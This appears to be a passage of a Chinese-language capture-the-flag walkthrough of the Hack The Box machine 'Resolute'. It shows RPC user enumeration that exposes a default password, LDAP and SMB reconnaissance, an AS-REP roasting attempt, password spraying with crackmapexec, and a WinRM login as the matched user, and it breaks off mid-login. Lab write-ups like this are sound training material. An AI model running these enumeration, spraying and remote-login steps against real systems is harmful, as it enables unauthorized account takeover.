RID: <span class="hljs-number">0</span>x2778 acb: <span class="hljs-number">0</span>x00000010 Account: naoki        Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10ba RID: <span class="hljs-number">0</span>x19d4 acb: <span class="hljs-number">0</span>x00000010 Account: paulo        Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10be RID: <span class="hljs-number">0</span>x19d8 acb: <span class="hljs-number">0</span>x00000010 Account: per  Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10a3 RID: <span class="hljs-number">0</span>x451 acb: <span class="hljs-number">0</span>x00000210 Account: ryan  Name: Ryan Bertrand     Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10b2 RID: <span class="hljs-number">0</span>x19cc acb: <span class="hljs-number">0</span>x00000010 Account: sally        Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10c2 RID: <span class="hljs-number">0</span>x2777 acb: <span class="hljs-number">0</span>x00000010 Account: simon        Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10bb RID: <span class="hljs-number">0</span>x19d5 acb: <span class="hljs-number">0</span>x00000010 Account: steve        Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10b8 RID: <span class="hljs-number">0</span>x19d2 acb: <span class="hljs-number">0</span>x00000010 Account: stevie       Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10af RID: <span class="hljs-number">0</span>x19c9 acb: <span class="hljs-number">0</span>x00000010 Account: sunita       Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10b7 RID: <span class="hljs-number">0</span>x19d1 acb: <span class="hljs-number">0</span>x00000010 Account: ulf  Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10c1 RID: <span class="hljs-number">0</span>x2776 acb: <span class="hljs-number">0</span>x00000010 Account: zach Name: (null)    Desc: (null)<br><span class="hljs-attribute">rpcclient</span> $&gt; <br></code></pre></td></tr></table></figure><p>为了阅读方便，我把重要的信息截了出来：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">index</span>: <span class="hljs-number">0x10a9</span> RID: <span class="hljs-number">0x457</span> acb: <span class="hljs-number">0x00000210</span> Account: marko <span class="hljs-type">Name</span>: Marko Novak       <span class="hljs-keyword">Desc</span>: Account created. <span class="hljs-keyword">Password</span> <span class="hljs-keyword">set</span> <span class="hljs-keyword">to</span> Welcome123!<br></code></pre></td></tr></table></figure><p>我尝试登录目标，不可以：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs subunit">$ evil-winrm -i 10.10.10.169 -u marco -p &#x27;Welcome123!&#x27;                           <br><br>Evil-WinRM shell v3.3<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                                                   <br><br>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion<br><br>Info: Establishing connection to remote endpoint<br><br><br><span class="hljs-keyword">Error: </span>An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError<br><br><span class="hljs-keyword">Error: </span>Exiting with code 1<br></code></pre></td></tr></table></figure><h5 id="LDAP端口："><a href="#LDAP端口：" class="headerlink" title="LDAP端口："></a>LDAP端口：</h5><p>ldapsearch这工具虽然我还是不会用，但是我找到了个替补选项，Nmap有一些默认的LDAP脚本，LDAP查询返回的垃圾信息也很多，我只放部分与目标相关的，以满足下对LDAP的好奇心：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">$</span> <span class="hljs-string">sudo</span> <span class="hljs-string">nmap</span> <span class="hljs-string">-sT</span> <span class="hljs-string">-Pn</span> <span class="hljs-string">-n</span> <span class="hljs-string">--open</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span> <span class="hljs-string">-p389</span> <span class="hljs-string">--script</span> <span class="hljs-string">ldap-rootdse</span><br><span class="hljs-string">Starting</span> <span class="hljs-string">Nmap</span> <span class="hljs-number">7.92</span> <span class="hljs-string">(</span> <span class="hljs-string">https://nmap.org</span> <span class="hljs-string">)</span> <span class="hljs-string">at</span> <span class="hljs-number">2022-04-23 </span><span class="hljs-number">17</span><span class="hljs-string">:56</span> <span class="hljs-string">CST</span><br><span class="hljs-string">Nmap</span> <span class="hljs-string">scan</span> <span class="hljs-string">report</span> <span class="hljs-string">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span><br><span class="hljs-string">Host</span> <span class="hljs-string">is</span> <span class="hljs-string">up</span> <span class="hljs-string">(0.17s</span> <span class="hljs-string">latency).</span><br><br><span class="hljs-string">PORT</span>    <span class="hljs-string">STATE</span> <span class="hljs-string">SERVICE</span><br><span class="hljs-number">389</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">ldap</span><br><span class="hljs-string">|</span> <span class="hljs-attr">ldap-rootdse:</span> <br><span class="hljs-string">|</span> <span class="hljs-string">LDAP</span> <span class="hljs-string">Results</span><br><span class="hljs-string">|</span>   <span class="hljs-string">&lt;ROOT&gt;</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">currentTime:</span> <span class="hljs-number">20220423100354.</span><span class="hljs-string">0Z</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">subschemaSubentry:</span> <span class="hljs-string">CN=Aggregate,CN=Schema,CN=Configuration,DC=megabank,DC=local</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">dsServiceName:</span> <span class="hljs-string">CN=NTDS</span> <span class="hljs-string">Settings,CN=RESOLUTE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=megabank,DC=local</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">namingContexts:</span> <span class="hljs-string">DC=megabank,DC=local</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">namingContexts:</span> <span class="hljs-string">CN=Configuration,DC=megabank,DC=local</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">namingContexts:</span> <span class="hljs-string">CN=Schema,CN=Configuration,DC=megabank,DC=local</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">namingContexts:</span> <span class="hljs-string">DC=DomainDnsZones,DC=megabank,DC=local</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">namingContexts:</span> <span class="hljs-string">DC=ForestDnsZones,DC=megabank,DC=local</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">defaultNamingContext:</span> <span class="hljs-string">DC=megabank,DC=local</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">schemaNamingContext:</span> <span class="hljs-string">CN=Schema,CN=Configuration,DC=megabank,DC=local</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">configurationNamingContext:</span> <span class="hljs-string">CN=Configuration,DC=megabank,DC=local</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">rootDomainNamingContext:</span> <span class="hljs-string">DC=megabank,DC=local</span><br><span class="hljs-string">......</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPVersion:</span> <span class="hljs-number">3</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPVersion:</span> <span class="hljs-number">2</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxPoolThreads</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxPercentDirSyncRequests</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxDatagramRecv</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxReceiveBuffer</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">InitRecvTimeout</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxConnections</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxConnIdleTime</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxPageSize</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxBatchReturnMessages</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxQueryDuration</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxDirSyncDuration</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxTempTableSize</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxResultSetSize</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MinResultSets</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxResultSetsPerConn</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxNotificationPerConn</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxValRange</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">MaxValRangeTransitive</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">ThreadMemoryLimit</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedLDAPPolicies:</span> <span class="hljs-string">SystemMemoryLimitPercent</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">highestCommittedUSN:</span> <span class="hljs-number">151908</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedSASLMechanisms:</span> <span class="hljs-string">GSSAPI</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedSASLMechanisms:</span> <span class="hljs-string">GSS-SPNEGO</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedSASLMechanisms:</span> <span class="hljs-string">EXTERNAL</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">supportedSASLMechanisms:</span> <span class="hljs-string">DIGEST-MD5</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">dnsHostName:</span> <span class="hljs-string">Resolute.megabank.local</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">ldapServiceName:</span> <span class="hljs-string">megabank.local:resolute$@MEGABANK.LOCAL</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">serverName:</span> <span class="hljs-string">CN=RESOLUTE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=megabank,DC=local</span><br><span class="hljs-string">......</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">isSynchronized:</span> <span class="hljs-literal">TRUE</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">isGlobalCatalogReady:</span> <span class="hljs-literal">TRUE</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">domainFunctionality:</span> <span class="hljs-number">7</span><br><span class="hljs-string">|</span>       <span class="hljs-attr">forestFunctionality:</span> <span class="hljs-number">7</span><br><span class="hljs-string">|_</span>      <span class="hljs-attr">domainControllerFunctionality:</span> <span class="hljs-number">7</span><br><span class="hljs-attr">Service Info: Host:</span> <span class="hljs-string">RESOLUTE;</span> <span class="hljs-attr">OS:</span> <span class="hljs-string">Windows</span><br><br><span class="hljs-attr">Nmap done:</span> <span class="hljs-number">1</span> <span class="hljs-string">IP</span> <span class="hljs-string">address</span> <span class="hljs-string">(1</span> <span class="hljs-string">host</span> <span class="hljs-string">up)</span> <span class="hljs-string">scanned</span> <span class="hljs-string">in</span> <span class="hljs-number">2.12</span> <span class="hljs-string">seconds</span><br></code></pre></td></tr></table></figure><p>它似乎是有一个子域：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">resolute$<span class="hljs-symbol">@MEGABANK</span>.<span class="hljs-keyword">LOCAL</span><br></code></pre></td></tr></table></figure><h5 id="SMB端口："><a href="#SMB端口：" class="headerlink" title="SMB端口："></a>SMB端口：</h5><p>遗憾的是，目标不允许匿名访问共享：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">$ smbclient -N -L \\<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span><br>Anonymous <span class="hljs-keyword">login</span> successful<br><br>        Sharename       <span class="hljs-keyword">Type</span>      <span class="hljs-keyword">Comment</span><br>        <span class="hljs-comment">---------       ----      -------</span><br>Reconnecting <span class="hljs-keyword">with</span> SMB1 <span class="hljs-keyword">for</span> workgroup listing.<br>do_connect: <span class="hljs-keyword">Connection</span> <span class="hljs-keyword">to</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span> failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)<br>Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">connect</span> <span class="hljs-keyword">with</span> SMB1 <span class="hljs-comment">-- no workgroup available</span><br></code></pre></td></tr></table></figure><p>或许我可以试试通过RPC得到的口令：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">$ crackmapexec smb <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span> -u marco -p <span class="hljs-string">&#x27;Welcome123!&#x27;</span> <span class="hljs-comment">--continue-on-success</span><br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span>    <span class="hljs-number">445</span>    RESOLUTE         [*] Windows <span class="hljs-keyword">Server</span> <span class="hljs-number">2016</span> Standard <span class="hljs-number">14393</span> x64 (<span class="hljs-type">name</span>:RESOLUTE) (<span class="hljs-keyword">domain</span>:megabank.<span class="hljs-keyword">local</span>) (signing:<span class="hljs-keyword">True</span>) (SMBv1:<span class="hljs-keyword">True</span>)<br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span>    <span class="hljs-number">445</span>    RESOLUTE         [-] megabank.<span class="hljs-keyword">local</span>\marco:Welcome123! STATUS_LOGON_FAILURE<br></code></pre></td></tr></table></figure><p>它也不可以。其他端口我觉得我没必要写，因为它没什么内容，尤其是两个http服务端口，都是not found。即使强行爆破一下，也是什么都没有的：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs subunit">$ dirsearch -u http://10.10.10.169:5985/<br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                     <br> (_||| _) (/_(_|| (_| )                                                                                                              <br>                                                                                                                                     <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /home/worldisend/.dirsearch/reports/10.10.10.169<span class="hljs-string">-5985</span>/-_22<span class="hljs-string">-04</span><span class="hljs-string">-23</span>_17<span class="hljs-string">-51</span><span class="hljs-string">-44</span>.txt<br><br><span class="hljs-keyword">Error </span>Log: /home/worldisend/.dirsearch/logs/errors<span class="hljs-string">-22</span><span class="hljs-string">-04</span><span class="hljs-string">-23</span>_17<span class="hljs-string">-51</span><span class="hljs-string">-44</span>.log<br><br>Target: http://10.10.10.169:5985/<br><br>[17:51:45] Starting: <br>[17:51:51] 403 -  312B  - /%2e%2e//google.com                              <br>[17:52:25] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           <br>[17:54:23] 405 -    0B  - /wsman                                            <br>                                                                             <br>Task Completed  <br></code></pre></td></tr></table></figure><h5 id="kerberos端口："><a href="#kerberos端口：" class="headerlink" title="kerberos端口："></a>kerberos端口：</h5><p>我可以将从RPC枚举到的用户名提取做成一本字典，这里不需要枚举了，因为RPC本身就是从目标机器中查询出来的用户，这些用户本就是存在的。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Administrator</span><br><span class="hljs-attribute">Guest</span><br><span class="hljs-attribute">krbtgt</span><br><span class="hljs-attribute">DefaultAccount</span><br><span class="hljs-attribute">ryan</span><br><span class="hljs-attribute">marko</span><br><span class="hljs-attribute">sunita</span><br><span class="hljs-attribute">abigail</span><br><span class="hljs-attribute">marcus</span><br><span class="hljs-attribute">sally</span><br><span class="hljs-attribute">fred</span><br><span class="hljs-attribute">angela</span><br><span class="hljs-attribute">felicia</span><br><span class="hljs-attribute">gustavo</span><br><span class="hljs-attribute">ulf</span><br><span class="hljs-attribute">stevie</span><br><span class="hljs-attribute">claire</span><br><span class="hljs-attribute">paulo</span><br><span class="hljs-attribute">steve</span><br><span class="hljs-attribute">annette</span><br><span class="hljs-attribute">annika</span><br><span class="hljs-attribute">per</span><br><span class="hljs-attribute">claude</span><br><span class="hljs-attribute">melanie</span><br><span class="hljs-attribute">zach</span><br><span class="hljs-attribute">simon</span><br><span class="hljs-attribute">naoki</span><br></code></pre></td></tr></table></figure><p>我试着去枚举目标中保存有AS-REP的哈希：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">$ ../toolbox/impacket-<span class="hljs-number">0.9</span>.<span class="hljs-number">24</span>/examples/GetNPUsers.py &#x27;MEGABANK.LOCAL/&#x27; -usersfile ./users.txt -format hashcat -outputfile hashes.txt -dc-ip <span class="hljs-number">10.10</span>.<span class="hljs-number">10.169</span><br>Impacket v0.<span class="hljs-number">9.24</span> - Copyright <span class="hljs-number">2021</span> SecureAuth Corporation<br><br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">Administrator</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)<br>[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)<br>[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">ryan</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">marko</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">sunita</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">abigail</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">marcus</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">sally</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">fred</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">angela</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">felicia</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">gustavo</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">ulf</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">stevie</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">claire</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">paulo</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">steve</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">annette</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">annika</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">per</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">claude</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">melanie</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">zach</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">simon</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">naoki</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br></code></pre></td></tr></table></figure><p>但是我失败了，一条哈希都没有。没想到这次我竟然这么快就进入了死胡同，因为我现在只有一堆用户名和一个口令。</p><h5 id="密码喷涂："><a href="#密码喷涂：" class="headerlink" title="密码喷涂："></a>密码喷涂：</h5><p>还是我局限了在目标机器中有个标签”<strong>Password Spraying</strong>“，即密码喷涂的意思，它类似于暴力破解，但不同的是，密码喷涂是拥有口令之后，对不同的用户名进行枚举猜解，从而获取完整的合法账户凭证，我可以借助SMB共享来间接的确定这一点，信息也有很多，我会截出关键的，因为它实在太明显了：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">$ crackmapexec smb <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span> -u ./users.txt -p <span class="hljs-string">&#x27;Welcome123!&#x27;</span> <span class="hljs-comment">--continue-on-success</span><br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span>    <span class="hljs-number">445</span>    RESOLUTE         [*] Windows <span class="hljs-keyword">Server</span> <span class="hljs-number">2016</span> Standard <span class="hljs-number">14393</span> x64 (<span class="hljs-type">name</span>:RESOLUTE) (<span class="hljs-keyword">domain</span>:megabank.<span class="hljs-keyword">local</span>) (signing:<span class="hljs-keyword">True</span>) (SMBv1:<span class="hljs-keyword">True</span>)<br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span>    <span class="hljs-number">445</span>    RESOLUTE         [-] megabank.<span class="hljs-keyword">local</span>\Administrator:Welcome123! STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span>    <span class="hljs-number">445</span>    RESOLUTE         [-] megabank.<span class="hljs-keyword">local</span>\Guest:Welcome123! STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span>    <span class="hljs-number">445</span>    RESOLUTE         [+] megabank.<span class="hljs-keyword">local</span>\melanie:Welcome123! <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span>    <span class="hljs-number">445</span>    RESOLUTE         [-] megabank.<span class="hljs-keyword">local</span>\zach:Welcome123! STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span>    <span class="hljs-number">445</span>    RESOLUTE         [-] megabank.<span class="hljs-keyword">local</span>\simon:Welcome123! STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span>    <span class="hljs-number">445</span>    RESOLUTE         [-] megabank.<span class="hljs-keyword">local</span>\naoki:Welcome123! STATUS_LOGON_FAILURE <br></code></pre></td></tr></table></figure><p>倒数第四条信息，看起来我获取的口令是与melanie匹配的。</p><h5 id="以melanie身份登录目标并获取user-txt："><a href="#以melanie身份登录目标并获取user-txt：" class="headerlink" title="以melanie身份登录目标并获取user.txt："></a>以melanie身份登录目标并获取user.txt：</h5><p>我可以试着去登录目标：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">$ evil-winrm -i <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span> -u melanie -p <span class="hljs-string">&#x27;Welcome123!&#x27;</span><br><br>Evil-WinRM shell v3<span class="hljs-number">.3</span><br><br><span class="hljs-built_in">Warning</span>: Remote <span class="hljs-type">path</span> completions <span class="hljs-keyword">is</span> disabled due <span class="hljs-keyword">to</span> ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> <span class="hljs-keyword">is</span> unimplemented <span class="hljs-keyword">on</span> this machine<br><br>Data: <span class="hljs-keyword">For</span> more information, <span class="hljs-keyword">check</span> Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-<span class="hljs-type">path</span>-completion<br><br><span 